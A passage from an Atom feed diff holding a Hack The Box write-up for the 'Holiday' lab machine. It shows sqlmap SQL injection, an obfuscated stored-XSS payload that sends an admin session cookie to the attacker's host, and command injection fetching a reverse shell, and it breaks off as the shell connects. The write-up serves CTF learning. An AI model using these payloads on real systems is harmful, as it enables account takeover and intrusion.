@@ -1,4 +1,485 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://ezploisite.it/feed.xml" rel="self" type="application/atom+xml" /><link href="https://ezploisite.it/" rel="alternate" type="text/html" /><updated>2020-04-26T21:52:17+02:00</updated><id>https://ezploisite.it/feed.xml</id><title type="html">ezploisite.it</title><subtitle>Posts about security and CTFs</subtitle><author><name>Ezploisite</name><email>bomb@protonmail.com</email></author><entry><title type="html">Joker - Hack The Box</title><link href="https://ezploisite.it/htb-writeup-joker/" rel="alternate" type="text/html" title="Joker - Hack The Box" /><published>2020-04-25T00:00:00+02:00</published><updated>2020-04-25T00:00:00+02:00</updated><id>https://ezploisite.it/htb-writeup-joker</id><content type="html" xml:base="https://ezploisite.it/htb-writeup-joker/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/jokera.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://ezploisite.it/feed.xml" rel="self" type="application/atom+xml" /><link href="https://ezploisite.it/" rel="alternate" type="text/html" /><updated>2020-04-28T00:35:43+02:00</updated><id>https://ezploisite.it/feed.xml</id><title type="html">ezploisite.it</title><subtitle>Posts about security and CTFs</subtitle><author><name>Ezploisite</name><email>bomb@protonmail.com</email></author><entry><title type="html">Holiday - Hack The Box</title><link href="https://ezploisite.it/htb-writeup-holiday/" rel="alternate" type="text/html" title="Holiday - Hack The Box" /><published>2020-04-28T00:00:00+02:00</published><updated>2020-04-28T00:00:00+02:00</updated><id>https://ezploisite.it/htb-writeup-holiday</id><content type="html" xml:base="https://ezploisite.it/htb-writeup-holiday/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Holiday was a hard box with a SQL Injection through a post form to retrieve credentials to login. Once gained access, we can stole the admin cookie with an XSS stored in the web page. After that, we can perform command injection through a form, bypassing the regex and obtain the reverse shell on the remote system. For the privesc we have sudo rights with npm to install our malicious json package and getting root shell.&lt;/p&gt;
+
+&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We can perform a SQL injection through a login form  retrieving the credentials.&lt;/li&gt;
+  &lt;li&gt;Now we can use those credentials to access the website and perform an XSS Stored bypassing the filters.&lt;/li&gt;
+  &lt;li&gt;With a command injection and the appropriate regex bypass through a form, allow us to get a reverse shell.&lt;/li&gt;
+  &lt;li&gt;Sudo -l allow us to install a malicious json package with npm.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;portscan-tcp&quot;&gt;Portscan TCP&lt;/h2&gt;
+
+&lt;p&gt;We discover on the remote host 2 open TCP ports: 22 SSH and 8000 Node.js Express Framework.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; nmap -sV -sC -O 10.10.10.25
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-27 16:08 CEST
+Nmap scan report for 10.10.10.25
+Host is up (0.042s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c3:aa:3d:bd:0e:01:46:c9:6b:46:73:f3:d1:ba:ce:f2 (RSA)
+|   256 b5:67:f5:eb:8d:11:e9:0f:dd:f4:52:25:9f:b1:2f:23 (ECDSA)
+|_  256 79:e9:78:96:c5:a8:f4:02:83:90:58:3f:e5:8d:fa:98 (ED25519)
+8000/tcp open  http    Node.js Express framework
+|_http-title: Error
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;recon-http&quot;&gt;Recon HTTP&lt;/h2&gt;
+
+&lt;p&gt;If we can try to connect to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.25:8000&lt;/code&gt; we will see just an image on the web page.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So we can try to bruteforce the directories with dirsearch:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo dirsearch -&amp;gt; ./dirsearch.py -u 10.10.10.25:8000 -w /usr/share/dirb/wordlists/small.txt -e php,html,txt,css,js,xml
+
+ _|. _ _  _  _  _ _|_    v0.3.9
+(_||| _) (/_(_|| (_| )
+
+Extensions: php, html, txt, css, js, xml | HTTP method: get | Threads: 10 | Wordlist size: 959
+
+Error Log: /root/Documenti/joker/dirsearch/logs/errors-20-04-27_16-29-33.log
+
+Target: 10.10.10.25:8000
+
+[16:29:33] Starting: 
+[16:29:33] 302 -   28B  - /Admin  -&amp;gt;  /login
+[16:29:33] 302 -   28B  - /admin  -&amp;gt;  /login
+[16:29:33] 302 -   28B  - /agent  -&amp;gt;  /login
+[16:29:34] 301 -  165B  - /css  -&amp;gt;  /css/
+[16:29:35] 301 -  165B  - /img  -&amp;gt;  /img/
+[16:29:35] 301 -  163B  - /js  -&amp;gt;  /js/
+[16:29:36] 302 -   28B  - /logout  -&amp;gt;  /login
+[16:29:36] 200 -    1KB - /login
+                                         
+Task Completed 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And here we are! We got an admin login page:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday2.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;sql-injection-through-post-parameters&quot;&gt;SQL injection through POST parameters&lt;/h2&gt;
+
+&lt;p&gt;Unfortunately we don’t have the credentials to login, but, if we set our FoxyProxy to 8080 and we intercept a request to login from the /admin page through Burpsuite, we can send the request to sqlmap trying to inject some queries to retrieve the database content.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo holiday -&amp;gt; sqlmap -r sql.txt -p username --batch --level=3 --risk=3 --dbs
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.3.11#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [&quot;]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:35:37 /2020-04-27/
+
+[16:35:37] [INFO] parsing HTTP request from 'sql.txt'
+[16:35:37] [INFO] testing connection to the target URL
+[16:35:37] [INFO] checking if the target is protected by some kind of WAF/IPS
+[16:35:37] [INFO] testing if the target URL content is stable
+[16:35:37] [INFO] target URL content is stable
+[16:35:37] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
+[16:35:38] [INFO] testing for SQL injection on POST parameter 'username'
+[16:35:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:35:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[16:35:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[16:35:44] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable (with --string=&quot;Invalid User&quot;)
+[16:35:44] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'H2' 
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 228 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: username=admin&quot;) OR NOT 4022=4022 AND (&quot;Fset&quot;=&quot;Fset&amp;amp;password=admin
+---
+
+[16:35:52] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Amazing! It worked! This happens because the parameters that pass the data to the back-end are not properly sanitized, since the concatenated queries allow the user input to be inserted. Now let’s extract the data from the database.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo holiday -&amp;gt; sqlmap -r sql.txt -p username --batch --level=3 --risk=3 --dbs --dump
+        ___
+       __H__                                                                                                                                                   
+ ___ ___[)]_____ ___ ___  {1.3.11#stable}                                                                                                                      
+|_ -| . [.]     | .'| . |                                                                                                                                      
+|___|_  [,]_|_|_|__,|  _|                                                                                                                                      
+      |_|V...       |_|   http://sqlmap.org                                                                                                                    
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 17:07:51 /2020-04-27/
+
+[17:07:51] [INFO] parsing HTTP request from 'sql.txt'
+[17:07:52] [INFO] resuming back-end DBMS 'sqlite' 
+[17:07:52] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: username=admin&quot;) OR NOT 4022=4022 AND (&quot;Fset&quot;=&quot;Fset&amp;amp;password=admin
+---
+[17:07:52] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+
+[17:12:30] [INFO] fetching entries for table 'notes' in database 'SQLite_masterdb'
+[17:12:30] [INFO] fetching number of entries for table 'notes' in database 'SQLite_masterdb'
+[17:13:58] [INFO] retrieved: 1
+[17:13:58] [INFO] retrieved: 1
+[17:13:59] [INFO] retrieved: 1
+[17:14:00] [INFO] retrieved: fdc8cd4cff2c19e0d1022e78481ddf36
+[17:14:24] [INFO] retrieved: RickA
+[17:14:28] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
+do you want to crack them via a dictionary-based attack? [Y/n/q] Y
+[17:14:28] [INFO] using hash method 'md5_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+&amp;gt; 1
+[17:14:28] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] N
+[17:14:28] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+[17:14:28] [INFO] starting 2 processes 
+[17:14:43] [WARNING] no clear password(s) found                                                                                                               
+Database: SQLite_masterdb
+Table: users
+[1 entry]
++----+--------+----------+----------------------------------+
+| id | active | username | password                         |
++----+--------+----------+----------------------------------+
+| 1  | 1      | RickA    | fdc8cd4cff2c19e0d1022e78481ddf36 |
++----+--------+----------+----------------------------------+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Finally we retrieve an username &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RickA&lt;/code&gt; and a MD5 password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fdc8cd4cff2c19e0d1022e78481ddf36&lt;/code&gt;, that making a search on google we can decrypt with md5hashing.net.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;login-with-credentials&quot;&gt;LOGIN with credentials&lt;/h2&gt;
+
+&lt;p&gt;After the login we are redirected to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/agent&lt;/code&gt; which seems to be a management booking portal with agents credentials.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;By clicking on a random section, we can see some informations relative to the agent section:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday6.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And by consulting the notes option, we can assume there is some script going on the background that goes to a page and approve something.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;cross-site-scripting-xss&quot;&gt;Cross-site scripting (XSS)&lt;/h2&gt;
+
+&lt;p&gt;The message came from notes section makes me think I might be able to use javascript code to perform an XSS over an administrator account. Let’s test if I inject a ping command into an image tag, if it comes back:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday8.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;img src=http://10.10.14.27:8000 /&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo Documenti -&amp;gt; python -m SimpleHTTPServer 8000
+Serving HTTP on 0.0.0.0 port 8000 ...
+10.10.10.25 - - [27/Apr/2020 20:26:55] &quot;GET / HTTP/1.1&quot; 200 -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I got a ping back! But, I if try to use an HTML tag like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;&lt;/code&gt; the ping didn’t come back. That’s happens because the server sanitizes any HTML tags except for images tags. Fortunately we can bypass this filter, wrapping the tag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;&lt;/code&gt; inside the img tag.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;img src=/&amp;gt;&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;/&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now that I was able to inject a script tag, the question became how I could use this to inject a javascript payload while bypassing any escaping. Using a combination of eval and String.fromCharCode I was able to inject an arbitrary javascript payload that would be executed as the administrator, using the following HTML as a wrapper.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;img src=&quot;/&amp;gt;&amp;lt;script&amp;gt;eval(String.fromCharCode(... payload ...))&amp;lt;/script&amp;gt;&quot; /&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And this as the payload.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;document.write('&amp;lt;script src=&quot;http://10.10.14.27:8000&quot;&amp;gt;&amp;lt;/script&amp;gt;');
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s charcode encode this:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;100, 111, 99, 117, 109, 101, 110, 116, 46, 119, 114, 105, 116, 101, 40, 39, 60, 115, 99, 114, 105, 112, 116, 32, 115, 114, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 49, 48, 46, 49, 48, 46, 49, 52, 46, 50, 55, 58, 56, 48, 48, 48, 34, 62, 60, 47, 115, 99, 114, 105, 112, 116, 62, 39, 41, 59
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And once encoded, let’s place it in the XSS wrapper.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;img src=&quot;/&amp;gt;&amp;lt;script&amp;gt;eval(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 119, 114, 105, 116, 101, 40, 39, 60, 115, 99, 114, 105, 112, 116, 32, 115, 114, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 49, 48, 46, 49, 48, 46, 49, 52, 46, 50, 55, 58, 56, 48, 48, 48, 34, 62, 60, 47, 115, 99, 114, 105, 112, 116, 62, 39, 41, 59))&amp;lt;/script&amp;gt;&quot; /&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo Documenti -&amp;gt; python -m SimpleHTTPServer 8000
+Serving HTTP on 0.0.0.0 port 8000 ...
+10.10.10.25 - - [27/Apr/2020 21:13:57] &quot;GET / HTTP/1.1&quot; 200 -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once again i got the ping back from the administrator, so, now it’s time to grub the session cookie from him:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;window.addEventListener('DOMContentLoaded', function(e) {
+  window.location = &quot;http://10.10.14.27:8000/?cookie=&quot; + encodeURI(document.getElementsByName(&quot;cookie&quot;)[0].value)
+})
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s encode it.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;119, 105, 110, 100, 111, 119, 46, 97, 100, 100, 69, 118, 101, 110, 116, 76, 105, 115, 116, 101, 110, 101, 114, 40, 39, 68, 79, 77, 67, 111, 110, 116, 101, 110, 116, 76, 111, 97, 100, 101, 100, 39, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 101, 41, 32, 123, 32, 119, 105, 110, 100, 111, 119, 46, 108, 111, 99, 97, 116, 105, 111, 110, 32, 61, 32, 34, 104, 116, 116, 112, 58, 47, 47, 49, 48, 46, 49, 48, 46, 49, 52, 46, 50, 55, 58, 56, 48, 48, 48, 47, 63, 99, 111, 111, 107, 105, 101, 61, 34, 32, 43, 32, 101, 110, 99, 111, 100, 101, 85, 82, 73, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 78, 97, 109, 101, 40, 34, 99, 111, 111, 107, 105, 101, 34, 41, 91, 48, 93, 46, 118, 97, 108, 117, 101, 41, 32, 125, 41
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And replace:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;img src=&quot;/&amp;gt;&amp;lt;script&amp;gt;eval(String.fromCharCode(119, 105, 110, 100, 111, 119, 46, 97, 100, 100, 69, 118, 101, 110, 116, 76, 105, 115, 116, 101, 110, 101, 114, 40, 39, 68, 79, 77, 67, 111, 110, 116, 101, 110, 116, 76, 111, 97, 100, 101, 100, 39, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 101, 41, 32, 123, 32, 119, 105, 110, 100, 111, 119, 46, 108, 111, 99, 97, 116, 105, 111, 110, 32, 61, 32, 34, 104, 116, 116, 112, 58, 47, 47, 49, 48, 46, 49, 48, 46, 49, 52, 46, 50, 55, 58, 56, 48, 48, 48, 47, 63, 99, 111, 111, 107, 105, 101, 61, 34, 32, 43, 32, 101, 110, 99, 111, 100, 101, 85, 82, 73, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 78, 97, 109, 101, 40, 34, 99, 111, 111, 107, 105, 101, 34, 41, 91, 48, 93, 46, 118, 97, 108, 117, 101, 41, 32, 125, 41))&amp;lt;/script&amp;gt;&quot; /&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Finally I got a ping back with the administrator session cookie:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo Documenti -&amp;gt; nc -lvnp 8000
+listening on [any] 8000 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.10.10.25] 42920
+GET /?cookie=connect.sid=s%253A3ac3a270-88b1-11ea-b152-3b1ed3b3d691.AtGD5UtDV%252Fv7XlfBQ9MEfehRLtokvHHNXBFeEpD9%252FTA HTTP/1.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Referer: http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65
+User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
+Connection: Keep-Alive
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,*
+Host: 10.10.14.27:8000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The cookie is url encoded, so we need first to decode it:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday10.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And then update in Firefox dev tools:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday9.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;An admin section is appeared!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday11.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;from-admin-to-reverse-shell&quot;&gt;From Admin to Reverse Shell&lt;/h2&gt;
+
+&lt;p&gt;With this admin cookie I also gain access to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.25:8000/admin&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday12.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hitting the button &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Bookings&lt;/code&gt; we can download a file:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday13.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday14.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;But intercepting the request during the request to download the file, we can see something really interesting:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /admin/export?table=bookings HTTP/1.1
+Host: 10.10.10.25:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.25:8000/admin
+Connection: close
+Cookie: connect.sid=s%3A3ac3a270-88b1-11ea-b152-3b1ed3b3d691.AtGD5UtDV%2Fv7XlfBQ9MEfehRLtokvHHNXBFeEpD9%2FTA
+Upgrade-Insecure-Requests: 1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday15.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The list of allowed characters is interesting. Why allow “&amp;amp;” and “/”? This makes me think that this might be a command injection vulnerability.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday16.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It’s working! Now we have to obtain a reverse shell. But first I need to know &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;who am I&lt;/code&gt;, if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget&lt;/code&gt; is installed and if i can &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;write&lt;/code&gt; to the current directory:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday17.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday18.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday19.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Since we can write on the current directory and we can use wget on the remote machine, I’ll create a file with a reverse shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday20.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;But how can we download something from an ip address if only [a-z0–9&amp;amp;\s\/] is allowed? The key hear is to remember that ip address are just 32 bit numbers, and most tools can take a number of different formats, including hexadecimal. Let’s go on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;miniwebtool.com/ip-adress-to-hex-convert/&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x0A0A0E1B
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then we have to set the letters of our hexadecimal IP for case sensitive and download the reverse to the remote machine.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday21.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo holiday -&amp;gt; python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+10.10.10.25 - - [28/Apr/2020 00:19:48] &quot;GET /reverse HTTP/1.1&quot; 200 -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Give the permissions to the reverse:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday22.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And then exec it!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday23.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; rlwrap nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.10.10.25] 46466
